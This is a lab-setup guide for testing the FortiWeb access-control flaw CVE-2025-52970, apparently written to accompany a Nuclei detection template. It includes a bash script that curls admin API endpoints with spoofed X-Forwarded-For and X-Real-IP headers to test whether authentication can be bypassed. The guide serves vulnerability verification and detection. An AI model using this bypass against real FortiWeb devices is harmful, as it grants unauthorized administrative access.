# Vulnerable FortiWeb Instance Setup for CVE-2025-52970

## Overview
This document provides detailed instructions for setting up a vulnerable FortiWeb instance to test CVE-2025-52970 (Broken Access Control vulnerability).

## Vulnerability Details
- **CVE**: CVE-2025-52970
- **Type**: Broken Access Control
- **Severity**: High (CVSS 9.8)
- **Affected Versions**: FortiWeb <= 7.6.3, <= 7.4.7, <= 7.2.10, and <= 7.0.10
- **Impact**: Unauthenticated remote attackers can gain admin privileges via crafted requests

## Prerequisites
- VMware Workstation, VirtualBox, or similar virtualization platform
- Minimum 4GB RAM, 2 CPU cores
- 50GB free disk space
- Network access for downloading FortiWeb VM

## Method 1: Official FortiWeb VM Setup

### Step 1: Download FortiWeb VM
1. Visit [Fortinet Support Portal](https://support.fortinet.com/)
2. Create account and login
3. Navigate to Downloads > FortiWeb
4. Download FortiWeb VM for your virtualization platform
5. **Important**: Download version 7.6.3 or earlier (vulnerable versions)

### Step 2: Deploy FortiWeb VM
1. Import the downloaded VM into your virtualization platform
2. Configure VM settings:
   - RAM: 4GB minimum
   - CPU: 2 cores minimum
   - Network: Bridge mode (to access from host)
3. Start the VM

### Step 3: Initial Configuration
1. Boot the FortiWeb VM
2. Login with default credentials (check FortiWeb documentation)
3. Configure basic network settings
4. Enable web management interface
5. Note the management IP address

### Step 4: Verify Vulnerability
1. Access the web interface: `https://<fortiweb-ip>`
2. Login with admin credentials
3. Navigate to System > Status to verify FortiWeb version
4. Confirm version is <= 7.6.3 (vulnerable)

## Method 2: Docker Setup (Alternative)

### Step 1: Create Dockerfile
```dockerfile
FROM ubuntu:20.04

# Install dependencies
RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    nginx \
    && rm -rf /var/lib/apt/lists/*

# Install Flask
RUN pip3 install flask

# Copy mock server
COPY mock-vulnerable-fortiweb.py /app/
WORKDIR /app

# Expose port
EXPOSE 80

# Run mock server
CMD ["python3", "mock-vulnerable-fortiweb.py"]
```

### Step 2: Build and Run
```bash
# Build the image
docker build -t vulnerable-fortiweb .

# Run the container
docker run -p 8080:80 vulnerable-fortiweb
```

## Method 3: Manual Testing Setup

### Step 1: Create Test Script
```bash
#!/bin/bash
# test-fortiweb-vulnerability.sh

TARGET_URL=$1
if [ -z "$TARGET_URL" ]; then
    echo "Usage: $0 <target_url>"
    echo "Example: $0 https://192.168.1.100"
    exit 1
fi

echo "Testing CVE-2025-52970 on: $TARGET_URL"
echo "=========================================="

# Test 1: System Status (should be accessible)
echo "Testing system status endpoint..."
curl -s -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 127.0.0.1" \
     "$TARGET_URL/api/v2.0/system/status" | jq .

# Test 2: Admin Endpoint (should be accessible with bypass)
echo "Testing admin endpoint..."
curl -s -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 127.0.0.1" \
     "$TARGET_URL/api/v2.0/system/admin" | jq .

echo "=========================================="
echo "If both endpoints return 200 with FortiWeb data, the vulnerability is present"
```

### Step 2: Run Tests
```bash
chmod +x test-fortiweb-vulnerability.sh
./test-fortiweb-vulnerability.sh https://your-fortiweb-ip
```

## Testing the Nuclei Template

### Step 1: Install Nuclei
```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

### Step 2: Run Template
```bash
# Basic test
nuclei -t http/cves/2025/CVE-2025-52970.yaml -u https://fortiweb-ip

# Debug test
nuclei -t http/cves/2025/CVE-2025-52970.yaml -debug -u https://fortiweb-ip -v
```

### Step 3: Verify Results
The template should detect:
- FortiWeb system status accessible without authentication
- Admin endpoints accessible with crafted headers
- Both returning 200 status codes with FortiWeb-specific content

## Expected Behavior

### Vulnerable Instance
- System status endpoint returns 200 with FortiWeb information
- Admin endpoint returns 200 with admin/privilege information
- Headers like X-Forwarded-For: 127.0.0.1 trigger the bypass

### Patched Instance
- System status endpoint returns 401 Unauthorized
- Admin endpoint returns 401 Unauthorized
- No admin privileges accessible without proper authentication

## Troubleshooting

### Common Issues
1. **Connection Refused**: Check if FortiWeb is running and accessible
2. **401 Unauthorized**: Instance may be patched or not vulnerable
3. **Timeout**: Check network connectivity and firewall rules

### Debug Steps
1. Verify FortiWeb version is <= 7.6.3
2. Check if web management is enabled
3. Confirm network connectivity
4. Test with curl first before using Nuclei

## Security Notice
⚠️ **WARNING**: Only use vulnerable instances in isolated lab environments. Never deploy vulnerable FortiWeb instances on production networks or public internet.

## References
- [CVE-2025-52970 Details](https://pwner.gg/blog/2025-08-13-fortiweb-cve-2025-52970)
- [FortiWeb Documentation](https://docs.fortinet.com/fortiweb/)
- [FortiGuard Advisory](https://fortiguard.fortinet.com/psirt/FG-IR-25-448)
